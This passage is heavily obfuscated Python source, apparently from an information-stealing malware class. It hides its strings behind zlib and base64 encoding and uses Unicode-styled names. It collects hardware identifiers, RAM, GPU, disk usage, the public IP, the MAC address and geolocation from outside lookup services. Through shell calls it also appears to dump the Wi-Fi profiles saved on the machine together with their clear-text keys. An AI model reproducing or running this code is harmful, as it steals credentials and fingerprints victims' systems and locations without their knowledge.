        𝗴𝙥𝘶 = 𝘸𝙢𝙞.WMI().Win32_VideoController()[𝘪𝘯𝘁.from_bytes(𝗺𝗮𝗽(lambda O, i: 278 - (𝙞𝙣𝘁(𝘖) + 𝙞), 𝙢𝗮𝙥(__𝙞𝙢𝗽𝘰𝗿𝘵__('base64').b64decode(__𝙞𝗺𝘱𝘰𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝘱(*[𝗶𝙩𝙚𝗿(__𝙞𝘮𝘱𝙤𝙧𝘵__('base64').b64decode(__𝘪𝗺𝙥𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝗿𝘢𝗻𝘨𝙚(0)), __𝙞𝙢𝙥𝙤𝙧𝘵__('base64').b64decode(__𝘪𝙢𝘱𝙤𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)].Name
        𝙧𝗮𝙢 = 𝗿𝗼𝙪𝘯𝙙(𝗳𝗹𝘰𝙖𝘁(𝙬𝗺𝙞.WMI().Win32_OperatingSystem()[𝗶𝘯𝙩.from_bytes(𝘮𝙖𝗽(lambda O, i: 822 - (𝙞𝙣𝙩(𝘖) + 𝗶), 𝘮𝗮𝙥(__𝗶𝙢𝗽𝙤𝗿𝙩__('base64').b64decode(__𝗶𝙢𝘱𝗼𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝘱(*[𝗶𝙩𝘦𝙧(__𝘪𝗺𝙥𝗼𝘳𝘁__('base64').b64decode(__𝗶𝙢𝗽𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝘢𝘯𝘨𝗲(0)), __𝙞𝘮𝗽𝙤𝗿𝘵__('base64').b64decode(__𝗶𝗺𝗽𝙤𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)].TotalVisibleMemorySize) / 𝙞𝙣𝘵.from_bytes(𝙢𝗮𝗽(lambda O, i: 808 - (𝘪𝗻𝙩(𝘖) + 𝘪), 𝘮𝗮𝗽(__𝙞𝙢𝘱𝙤𝘳𝘵__('base64').b64decode(__𝗶𝘮𝘱𝘰𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝘱(*[𝘪𝙩𝙚𝙧(__𝘪𝘮𝙥𝗼𝘳𝙩__('base64').b64decode(__𝙞𝙢𝗽𝙤𝘳𝘵__('zlib').decompress(b'x\xda\xf3wq4\xf1wq4\xf6\xab\xca.\x07\x00\x15\xd6\x03\xba')).decode())] * 3)), 𝗿𝘢𝘯𝗴𝘦(3)), __𝗶𝗺𝙥𝗼𝙧𝙩__('base64').b64decode(__𝘪𝗺𝘱𝙤𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False), 𝘪𝘯𝘵.from_bytes(𝙢𝗮𝙥(lambda O, i: 595 - (𝗶𝗻𝙩(𝙊) + 𝙞), 𝘮𝙖𝗽(__𝗶𝗺𝗽𝗼𝗿𝙩__('base64').b64decode(__𝘪𝘮𝙥𝙤𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝙥(*[𝘪𝘁𝘦𝘳(__𝙞𝗺𝘱𝙤𝗿𝙩__('base64').b64decode(__𝙞𝘮𝘱𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝗿𝗮𝘯𝘨𝗲(0)), __𝘪𝗺𝙥𝙤𝘳𝙩__('base64').b64decode(__𝙞𝙢𝙥𝘰𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False))
        𝗵𝘄𝙞𝙙 = 𝙜𝗲𝘁_𝗵𝙬𝙞𝘥()
        return (__𝙞𝙢𝘱𝗼𝗿𝘁__('base64').b64decode(__𝙞𝗺𝙥𝘰𝘳𝘵__('zlib').decompress(b'x\xda\x0bp)p\tu\x0b5\xf3\rq,\xf7sq\xad\xf2\rI7\xf4\xcd\xf2,\xf7wq4\xf2\xcbJ.\xf7\r1I\x0f5\xce\xa9Jq\x0f+\x01\x00=\x86\x0e\x80')).decode(), __𝗶𝗺𝗽𝗼𝘳𝘵__('base64').b64decode(__𝗶𝘮𝙥𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x8btwJ\x0f4t\n\xf3\xcft2O\x0b,\xf0\x08u\x0b5\xf3\xf4(\xb1t\xce\xf1r\n\t\xc9OO56\xf0\x0evK\xf1\nr\x01\xb1\r\xd3#\xdd\x1dm\x01\xae\x1e\x105')).decode().format(𝘤𝘱𝙪, 𝘨𝙥𝙪, 𝙧𝘢𝗺, 𝘩𝘸𝘪𝘥), False)

    def disk_data(self):
        𝗱𝘪𝘴𝙠 = (__𝗶𝘮𝘱𝘰𝗿𝙩__('base64').b64decode(__𝙞𝗺𝗽𝗼𝙧𝘵__('zlib').decompress(b'x\xdaK\xad\xca\xb7\xf0\x8f0H\x07\x00\rC\x02\xc5')).decode() * 𝗶𝗻𝘵.from_bytes(𝗺𝗮𝙥(lambda O, i: 872 - (𝙞𝗻𝘵(𝙊) + 𝙞), 𝗺𝗮𝙥(__𝗶𝘮𝗽𝙤𝘳𝘵__('base64').b64decode(__𝘪𝘮𝙥𝙤𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝗽(*[𝙞𝙩𝘦𝗿(__𝘪𝙢𝙥𝗼𝘳𝘵__('base64').b64decode(__𝙞𝘮𝙥𝙤𝘳𝙩__('zlib').decompress(b'x\xda\xf3w\x894\x01\x00\x02\xf2\x01!')).decode())] * 3)), 𝙧𝗮𝘯𝗴𝗲(1)), __𝗶𝙢𝘱𝗼𝙧𝘵__('base64').b64decode(__𝙞𝗺𝗽𝗼𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)).format(__𝘪𝙢𝘱𝙤𝙧𝘵__('base64').b64decode(__𝘪𝘮𝘱𝘰𝗿𝘁__('zlib').decompress(b'x\xda\x0b\xf2\xf0*H\xc9\r\xb5\x05\x00\x0c:\x02\xb8')).decode(), __𝗶𝙢𝗽𝘰𝗿𝘁__('base64').b64decode(__𝘪𝘮𝗽𝗼𝘳𝘁__('zlib').decompress(b'x\xda\x0b\xca\xf3\xca\x89\n\xb4\xb5\x05\x00\x0c\x84\x02\x9c')).decode(), __𝙞𝗺𝗽𝗼𝙧𝘁__('base64').b64decode(__𝙞𝗺𝗽𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x0bs\xb74\x88\x0c/\xb7\x05\x00\n\x83\x02k')).decode(), __𝘪𝗺𝗽𝘰𝘳𝙩__('base64').b64decode(__𝙞𝙢𝙥𝘰𝘳𝙩__('zlib').decompress(b'x\xda\x0b\x8b\xf0\xcb\xf1\n\xb4\xb5\x05\x00\x0b\xe2\x02~')).decode()) + __𝙞𝗺𝙥𝘰𝙧𝘁__('base64').b64decode(__𝗶𝗺𝙥𝗼𝗿𝘵__('zlib').decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode()
        for 𝘱𝙖𝗿𝙩 in 𝘱𝘴𝘂𝙩𝘪𝘭.disk_partitions(all=False):
            if 𝙤𝘴.name == __𝘪𝘮𝙥𝗼𝘳𝘵__('base64').b64decode(__𝘪𝙢𝗽𝗼𝘳𝘵__('zlib').decompress(b'x\xdaK\xca\x0b\xb4\x05\x00\x03\xb5\x01_')).decode():
                if __𝗶𝘮𝘱𝘰𝗿𝙩__('base64').b64decode(__𝗶𝗺𝗽𝗼𝘳𝙩__('zlib').decompress(b'x\xda\x8b4\n\xaaL22\xb0\x05\x00\x0b2\x02X')).decode() in 𝘱𝗮𝘳𝙩.opts or 𝗽𝙖𝗿𝘵.fstype == __𝘪𝙢𝙥𝗼𝘳𝘵__('base64').b64decode(__𝙞𝗺𝙥𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode():
                    continue
            𝘂𝘀𝘢𝘨𝙚 = 𝗽𝘀𝙪𝘵𝘪𝗹.disk_usage(𝗽𝙖𝘳𝘵.mountpoint)
            𝗱𝙞𝘴𝗸 += (__𝙞𝙢𝘱𝙤𝗿𝘁__('base64').b64decode(__𝗶𝘮𝙥𝙤𝙧𝙩__('zlib').decompress(b'x\xdaK\xad\xca\xb7\xf0\x8f0H\x07\x00\rC\x02\xc5')).decode() * 𝘪𝙣𝘵.from_bytes(𝗺𝘢𝘱(lambda O, i: 617 - (𝘪𝘯𝘵(𝘖) + 𝗶), 𝗺𝘢𝗽(__𝘪𝘮𝗽𝘰𝘳𝘵__('base64').b64decode(__𝘪𝙢𝗽𝗼𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝙥(*[𝗶𝘁𝗲𝙧(__𝗶𝙢𝗽𝗼𝙧𝘁__('base64').b64decode(__𝗶𝙢𝙥𝙤𝗿𝙩__('zlib').decompress(b'x\xda\xf3\xcbr\xad\x02\x00\x03~\x01x')).decode())] * 3)), 𝘳𝘢𝘯𝙜𝘦(1)), __𝗶𝗺𝙥𝗼𝘳𝙩__('base64').b64decode(__𝗶𝗺𝘱𝙤𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)).format(𝘱𝙖𝗿𝘵.device, 𝘴𝘵𝘳(𝘶𝙨𝙖𝙜𝘦.free // 𝗶𝗻𝘁.from_bytes(𝗺𝘢𝗽(lambda O, i: 749 - (𝙞𝙣𝙩(𝗢) + 𝘪), 𝙢𝗮𝘱(__𝘪𝙢𝙥𝙤𝘳𝘁__('base64').b64decode(__𝗶𝗺𝙥𝘰𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝗽(*[𝙞𝙩𝗲𝙧(__𝗶𝙢𝘱𝙤𝙧𝘁__('base64').b64decode(__𝗶𝙢𝘱𝗼𝗿𝘵__('zlib').decompress(b'x\xda\xf3\xab\n4\x06\x00\x03\x7f\x01M')).decode())] * 3)), 𝘳𝘢𝘯𝙜𝗲(1)), __𝘪𝙢𝘱𝗼𝗿𝙩__('base64').b64decode(__𝘪𝘮𝗽𝗼𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False) ** 𝘪𝗻𝘵.from_bytes(𝗺𝘢𝘱(lambda O, i: 887 - (𝘪𝙣𝙩(𝙊) + 𝘪), 𝗺𝙖𝙥(__𝗶𝙢𝙥𝗼𝙧𝙩__('base64').b64decode(__𝗶𝗺𝙥𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝗽(*[𝗶𝘁𝗲𝗿(__𝙞𝘮𝘱𝙤𝗿𝘵__('base64').b64decode(__𝘪𝙢𝗽𝘰𝙧𝙩__('zlib').decompress(b'x\xda\xf3w\t5\x06\x00\x02\xe9\x01\x1c')).decode())] * 3)), 𝙧𝘢𝗻𝗴𝙚(1)), __𝙞𝘮𝗽𝘰𝗿𝙩__('base64').b64decode(__𝗶𝙢𝙥𝘰𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)) + __𝙞𝗺𝘱𝘰𝙧𝙩__('base64').b64decode(__𝗶𝙢𝙥𝙤𝗿𝘁__('zlib').decompress(b'x\xda\x0b2\xf0\xb4\x05\x00\x02\xab\x01\t')).decode(), 𝘀𝘵𝘳(𝘂𝘴𝗮𝙜𝘦.total // 𝗶𝘯𝙩.from_bytes(𝘮𝗮𝘱(lambda O, i: 954 - (𝙞𝙣𝘵(𝗢) + 𝗶), 𝙢𝙖𝗽(__𝙞𝘮𝘱𝗼𝘳𝙩__('base64').b64decode(__𝘪𝗺𝗽𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝗽(*[𝙞𝙩𝙚𝗿(__𝗶𝘮𝘱𝗼𝙧𝘁__('base64').b64decode(__𝗶𝘮𝙥𝗼𝙧𝙩__('zlib').decompress(b'x\xda\xf3\x0f\t\xad\x04\x00\x03_\x01r')).decode())] * 3)), 𝗿𝙖𝗻𝙜𝘦(1)), __𝙞𝗺𝙥𝙤𝘳𝙩__('base64').b64decode(__𝗶𝙢𝘱𝙤𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False) ** 𝗶𝙣𝘁.from_bytes(𝗺𝘢𝙥(lambda O, i: 878 - (𝘪𝘯𝙩(𝙊) + 𝙞), 𝗺𝘢𝙥(__𝙞𝙢𝗽𝙤𝗿𝙩__('base64').b64decode(__𝗶𝘮𝘱𝗼𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝘱(*[𝘪𝘁𝙚𝘳(__𝘪𝗺𝘱𝗼𝘳𝘁__('base64').b64decode(__𝘪𝙢𝘱𝙤𝙧𝙩__('zlib').decompress(b'x\xda\xf3w\t4\x01\x00\x02\xe2\x01\x19')).decode())] * 3)), 𝗿𝗮𝗻𝙜𝘦(1)), __𝘪𝘮𝙥𝙤𝙧𝘵__('base64').b64decode(__𝗶𝙢𝗽𝙤𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)) + __𝘪𝘮𝘱𝙤𝘳𝙩__('base64').b64decode(__𝘪𝙢𝘱𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x0b2\xf0\xb4\x05\x00\x02\xab\x01\t')).decode(), 𝘀𝘵𝙧(𝘶𝘀𝘢𝙜𝘦.percent) + __𝙞𝙢𝘱𝘰𝙧𝘁__('base64').b64decode(__𝘪𝘮𝗽𝘰𝘳𝙩__('zlib').decompress(b'x\xda\xf3\n\xb4\xb5\x05\x00\x02\xd6\x01\x16')).decode()) + __𝘪𝗺𝗽𝙤𝗿𝙩__('base64').b64decode(__𝗶𝗺𝘱𝘰𝘳𝘁__('zlib').decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode()
        return (__𝙞𝘮𝘱𝗼𝗿𝘵__('base64').b64decode(__𝗶𝗺𝙥𝘰𝙧𝘵__('zlib').decompress(b'x\xda\xf3\xcf\x8d*N2v*O\r\xb3\xccN\x8c\xf0+\xf2\xcftr\x05\xd1\x00i\x91\x08h')).decode(), __𝗶𝗺𝘱𝘰𝙧𝙩__('base64').b64decode(__𝙞𝙢𝙥𝙤𝙧𝘁__('zlib').decompress(b'x\xda\x8btwJO56L\x8ftw\xb4\x05\x00\x18&\x03\x98')).decode().format(𝘥𝘪𝙨𝙠), False)

    def network_data(self):

        def geolocation(ip):
            𝙪𝘳𝙡 = __𝙞𝗺𝗽𝙤𝘳𝘵__('base64').b64decode(__𝘪𝗺𝗽𝘰𝗿𝙩__('zlib').decompress(b'x\xdaK\xf4\x082Hv\xc9/\xf31\xca)\xf7\tw+O\x0c6\xcdJ22(K\xcc\xf3+K\xca\xb44O\x0b\xb4\xb5\x05\x00\xe0\xd4\x0c\x05')).decode().format(𝘪𝗽)
            𝗿𝗲𝘴𝗽𝙤𝘯𝘴𝘦 = 𝘳𝘦𝘲𝙪𝙚𝘴𝘁𝘀.get(𝘂𝘳𝙡, headers={__𝘪𝘮𝙥𝘰𝙧𝘵__('base64').b64decode(__𝘪𝗺𝘱𝙤𝗿𝘁__('zlib').decompress(b'x\xda\x0b\x8b\xf0\xcbI\xce4t\x8a2\n+Mq\xb4\xb5\x05\x00-@\x05\x1e')).decode(): __𝗶𝙢𝙥𝗼𝙧𝘵__('base64').b64decode(__𝘪𝗺𝗽𝘰𝘳𝙩__('zlib').decompress(b'x\xda\r\xcd\xcb\x0eD0\x14\x00\xd0oR2\x8f\x85\x85G\x0c\xa6mRJ\xcbN#\xb9\xa6*\x11\xe2\xd5\xaf\x1f\x1fpr\xb8x?:q\xaeM\xf9r\xb0\x0e\xe0\x9b\xf4\xb3\x9a\x8a\xbdw\tp\xc3\x80\xf0`#\xf1\n52\x1b\xd5\xec\x99\xa5\x80h4\x02\x93\xe1\xa1>\xb5lE\x8e;\xc9v\xca\x89\x8b5AY4\xe02)(\x8f\x0eP\x1f\xb3\xb4e\x98\xb6\x82.\xea\xba\r\x1a.\x85\x1c\x83\xedx\xde\xd7Fc\xe6\x92\x9fw\x12\xcd\xa0B\xc9\xd4\xc8|\xc6\xb6\xb2\xf4\xf2,\x05\xdf\xff\x03%74\xf8')).decode()})
            𝘥𝘢𝙩𝙖 = 𝗿𝘦𝘀𝗽𝘰𝙣𝘴𝙚.json()
            return (𝘥𝗮𝙩𝗮[__𝘪𝗺𝘱𝘰𝗿𝘁__('base64').b64decode(__𝘪𝗺𝘱𝗼𝙧𝙩__('zlib').decompress(b'x\xda\x8b4\xb24L\xca\x0b\xaaL\r\xb4\xb5\x05\x00\x17\xea\x03\xc1')).decode()], 𝙙𝘢𝙩𝙖[__𝘪𝗺𝙥𝘰𝗿𝙩__('base64').b64decode(__𝙞𝘮𝙥𝗼𝘳𝘁__('zlib').decompress(b'x\xdaK\xce\r\xcbK\x0c\xb7,\r\xc9u+\x89\n\xb4\xb5\x05\x002"\x05\x9b')).decode()], 𝙙𝘢𝘁𝗮[__𝗶𝘮𝗽𝙤𝘳𝘁__('base64').b64decode(__𝘪𝘮𝗽𝗼𝙧𝘁__('zlib').decompress(b'x\xda\x8b4\xca1H\r\xb4\xb5\x05\x00\n\xe4\x02X')).decode()], 𝗱𝗮𝙩𝘢[__𝘪𝗺𝗽𝘰𝗿𝘵__('base64').b64decode(__𝙞𝙢𝗽𝘰𝘳𝙩__('zlib').decompress(b'x\xdaK\xcd\xcd)\x07\x00\x04.\x01\xb6')).decode()], 𝗱𝗮𝘁𝘢[__𝘪𝘮𝗽𝙤𝙧𝘵__('base64').b64decode(__𝗶𝘮𝗽𝗼𝙧𝙩__('zlib').decompress(b'x\xda\x8b\x8c\xf0\xb5\x05\x00\x03G\x01<')).decode()])
        𝙞𝙥 = 𝘳𝙚𝗾𝘂𝙚𝘀𝙩𝘴.get(__𝘪𝘮𝗽𝙤𝗿𝘵__('base64').b64decode(__𝙞𝙢𝘱𝙤𝙧𝙩__('zlib').decompress(b'x\xdaK\xf4\x082H\xf6\xf05\xf3\xa9\xb4\xccHv\xcf.M\x8cp*\x88\xca\xcb.M2\xf6\xca\x03\x00\x86\xb1\t\xaa')).decode()).text
        𝗺𝙖𝘤 = __𝗶𝗺𝙥𝙤𝙧𝙩__('base64').b64decode(__𝘪𝘮𝙥𝗼𝘳𝙩__('zlib').decompress(b'x\xda\xf3O\xb7\xb5\x05\x00\x03,\x011')).decode().join(𝗿𝗲.findall(__𝘪𝗺𝙥𝘰𝗿𝘁__('base64').b64decode(__𝗶𝗺𝘱𝗼𝙧𝘵__('zlib').decompress(b"x\xda\xf3\xc94\xb1\x05\x00\x03\x14\x01'")).decode(), __𝙞𝗺𝘱𝗼𝗿𝙩__('base64').b64decode(__𝘪𝙢𝘱𝗼𝘳𝙩__('zlib').decompress(b'x\xda\xf3\nq\xac\xf0\xcdK\xb7\x05\x00\x0c\x0b\x02\xb7')).decode() % 𝙪𝘂𝗶𝗱.getnode()))
        (𝙘𝙤𝘶𝘯𝙩𝘳𝘆, 𝙧𝘦𝙜𝙞𝘰𝙣, 𝗰𝙞𝘁𝘺, 𝘻𝘪𝘱_, 𝗮𝘴_) = 𝗴𝘦𝙤𝙡𝙤𝘤𝘢𝙩𝗶𝗼𝙣(𝗶𝗽)
        return (__𝗶𝘮𝘱𝗼𝘳𝘵__('base64').b64decode(__𝘪𝗺𝙥𝙤𝘳𝙩__('zlib').decompress(b'x\xda\xf3\xcf\xf3\xcbHq\x0f+Nr\xcf1\x88\n\xc9O\x0f\xc9\r3H1\xb2\xacL,\xb7\xb5\x05\x00\x8e\x0c\t\x92')).decode(), __𝙞𝙢𝘱𝗼𝗿𝘵__('base64').b64decode(__𝘪𝗺𝗽𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x8btwJ\x0f\x0esL\x0f\x0c\x0f\xcaN\xce\r\xabJ\xae\xcaOO5\xca)O\x0b,\xf0\x0b\x0c\xf5E\x137\xcc\x8846\xf0\x0e4\xb24L\xca\x0b\xaaL\r\x01\x89\xf9\x95\xa5\x84\x9b\x1a$\xe7\xe5X:\xe7x\xe5D\x19\xe5\x94%e\x01\xc5\x8d\xa1\xec<\x90\xfa\x1c\x03\xa8\xda\x82\x14\x8f\x1cKO\xe7\x0c\xf3\xd4\xdc\x9c\xf2\x08c\x83\x02\xe7\xec\x9c\x90P\x17\x90\x9c[U\x84\xb1az\xa4\xbb\xa3-\x00\x17/2\xe3')).decode().format(ip=𝘪𝙥, mac=𝙢𝗮𝙘, country=𝗰𝘰𝘶𝘯𝙩𝘳𝘺, region=𝙧𝗲𝗴𝗶𝙤𝗻, city=𝗰𝙞𝘵𝙮, zip_=𝘇𝙞𝙥_, as_=𝘢𝘴_), False)

    def wifi_data(self):
        (𝙣𝘦𝘁𝙬𝘰𝗿𝙠𝙨, 𝙤𝙪𝘁) = ([], __𝘪𝘮𝗽𝘰𝗿𝙩__('base64').b64decode(__𝗶𝘮𝙥𝗼𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())
        try:
            𝙬𝗶𝘧𝘪 = 𝘴𝘂𝘣𝙥𝗿𝙤𝗰𝘦𝙨𝘀.check_output([__𝙞𝗺𝙥𝙤𝘳𝙩__('base64').b64decode(__𝘪𝙢𝘱𝙤𝗿𝙩__('zlib').decompress(b'x\xdaK\xca\r3H6J\xb7\x05\x00\x0c4\x02\x8f')).decode(), __𝙞𝗺𝗽𝙤𝗿𝘵__('base64').b64decode(__𝗶𝘮𝘱𝘰𝗿𝘁__('zlib').decompress(b'x\xdaK1\xaa\xc8HJ\xb7\xb5\x05\x00\x0c\xd2\x02\xba')).decode(), __𝙞𝙢𝗽𝘰𝘳𝘵__('base64').b64decode(__𝗶𝗺𝘱𝗼𝗿𝙩__('zlib').decompress(b'x\xdaK6\xca(K)\xb7\xb5\x05\x00\x0c\xe8\x02\xc9')).decode(), __𝗶𝙢𝗽𝘰𝘳𝘵__('base64').b64decode(__𝙞𝗺𝗽𝙤𝗿𝘵__('zlib').decompress(b'x\xdaK\xf6\xf0*\x8b\xca\xcd)\x8e\x8a\xf0\xb5\x05\x00\x1c\xab\x04N')).decode()], shell=True, stdin=𝙨𝘂𝙗𝙥𝗿𝙤𝘤𝘦𝙨𝙨.PIPE, stderr=𝙨𝙪𝗯𝙥𝗿𝙤𝗰𝗲𝙨𝙨.PIPE).decode(__𝗶𝗺𝘱𝗼𝘳𝘁__('base64').b64decode(__𝘪𝘮𝗽𝙤𝘳𝘁__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()).split(__𝘪𝘮𝘱𝘰𝙧𝘵__('base64').b64decode(__𝙞𝗺𝗽𝗼𝘳𝘵__('zlib').decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode())
            𝙬𝙞𝙛𝙞 = [𝘪.split(__𝗶𝗺𝙥𝘰𝘳𝘁__('base64').b64decode(__𝘪𝗺𝘱𝙤𝙧𝙩__('zlib').decompress(b'x\xda\xf3O\xb7\xb5\x05\x00\x03,\x011')).decode())[𝗶𝘯𝙩.from_bytes(𝙢𝗮𝗽(lambda O, i: 304 - (𝘪𝙣𝘁(𝘖) + 𝘪), 𝙢𝘢𝙥(__𝙞𝙢𝘱𝘰𝙧𝘁__('base64').b64decode(__𝗶𝘮𝗽𝘰𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝗽(*[𝘪𝘁𝗲𝗿(__𝙞𝘮𝗽𝗼𝗿𝙩__('base64').b64decode(__𝘪𝗺𝙥𝘰𝙧𝙩__('zlib').decompress(b'x\xda\xf3\xadr\xac\x02\x00\x03\xa2\x01\x83')).decode())] * 3)), 𝘳𝙖𝙣𝘨𝗲(1)), __𝗶𝗺𝘱𝗼𝘳𝘵__('base64').b64decode(__𝙞𝙢𝘱𝗼𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)][𝘪𝗻𝙩.from_bytes(𝘮𝙖𝘱(lambda O, i: 975 - (𝗶𝙣𝙩(𝘖) + 𝙞), 𝙢𝘢𝘱(__𝗶𝙢𝙥𝙤𝙧𝘵__('base64').b64decode(__𝗶𝙢𝙥𝙤𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝘱(*[𝘪𝘵𝗲𝗿(__𝙞𝗺𝙥𝙤𝗿𝙩__('base64').b64decode(__𝘪𝘮𝗽𝙤𝗿𝘁__('zlib').decompress(b'x\xda\xf3\x0fI6\x00\x00\x032\x017')).decode())] * 3)), 𝘳𝙖𝗻𝙜𝙚(1)), __𝙞𝗺𝘱𝘰𝗿𝙩__('base64').b64decode(__𝘪𝙢𝗽𝗼𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False):-𝗶𝗻𝙩.from_bytes(𝙢𝗮𝗽(lambda O, i: 761 - (𝘪𝗻𝘁(𝗢) + 𝘪), 𝗺𝗮𝗽(__𝗶𝘮𝘱𝘰𝙧𝘵__('base64').b64decode(__𝗶𝗺𝗽𝙤𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝘱(*[𝘪𝘵𝘦𝙧(__𝙞𝙢𝗽𝗼𝗿𝘵__('base64').b64decode(__𝗶𝗺𝗽𝙤𝘳𝙩__('zlib').decompress(b'x\xda\xf3\xab\x8a,\x07\x00\x03\xd3\x01\x99')).decode())] * 3)), 𝙧𝙖𝘯𝙜𝗲(1)), __𝘪𝙢𝗽𝗼𝙧𝘁__('base64').b64decode(__𝙞𝙢𝙥𝗼𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] for 𝙞 in 𝘄𝗶𝘧𝙞 if __𝙞𝘮𝗽𝗼𝘳𝘁__('base64').b64decode(__𝙞𝙢𝗽𝘰𝗿𝘵__('zlib').decompress(b'x\xda\x0b\x0c\xaf(\xf6t\x0b\xab\x8a\x8a\xf0L\x0f\xf5\xf0*\x8b\xca\xcd)\x8e\n\xb4\xb5\x05\x00l\x0f\x08}')).decode() in 𝘪]
            for 𝘯𝗮𝙢𝙚 in 𝙬𝗶𝘧𝗶:
                try:
                    𝘳𝙚𝙨𝘶𝘭𝘁𝘴 = 𝘀𝘶𝗯𝗽𝙧𝘰𝗰𝘦𝙨𝙨.check_output([__𝗶𝘮𝗽𝗼𝙧𝙩__('base64').b64decode(__𝙞𝗺𝗽𝗼𝙧𝘵__('zlib').decompress(b'x\xdaK\xca\r3H6J\xb7\x05\x00\x0c4\x02\x8f')).decode(), __𝗶𝘮𝘱𝙤𝙧𝙩__('base64').b64decode(__𝙞𝗺𝘱𝗼𝙧𝘁__('zlib').decompress(b'x\xdaK1\xaa\xc8HJ\xb7\xb5\x05\x00\x0c\xd2\x02\xba')).decode(), __𝘪𝘮𝙥𝗼𝙧𝘁__('base64').b64decode(__𝙞𝗺𝗽𝗼𝙧𝘵__('zlib').decompress(b'x\xdaK6\xca(K)\xb7\xb5\x05\x00\x0c\xe8\x02\xc9')).decode(), __𝙞𝙢𝗽𝙤𝘳𝘁__('base64').b64decode(__𝗶𝘮𝘱𝗼𝘳𝙩__('zlib').decompress(b'x\xdaK\xf6\xf0*\x8b\xca\xcd)\x8e\n\xb4\xb5\x05\x00\x1cv\x047')).decode(), 𝗻𝙖𝗺𝘦, __𝗶𝘮𝗽𝗼𝗿𝙩__('base64').b64decode(__𝗶𝘮𝙥𝘰𝙧𝘵__('zlib').decompress(b'x\xdaK4\n3\r\x08\xf7+\x8e\nw\xab\x04\x00\x18]\x03\xf7')).decode()], shell=True, stdin=𝙨𝘶𝙗𝘱𝙧𝙤𝙘𝙚𝘀𝘴.PIPE, stderr=𝘀𝘂𝙗𝙥𝗿𝗼𝘤𝘦𝙨𝙨.PIPE).decode(__𝗶𝘮𝗽𝗼𝘳𝘵__('base64').b64decode(__𝙞𝗺𝙥𝘰𝙧𝙩__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()).split(__𝗶𝘮𝘱𝗼𝙧𝘵__('base64').b64decode(__𝘪𝘮𝙥𝘰𝙧𝘁__('zlib').decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode())
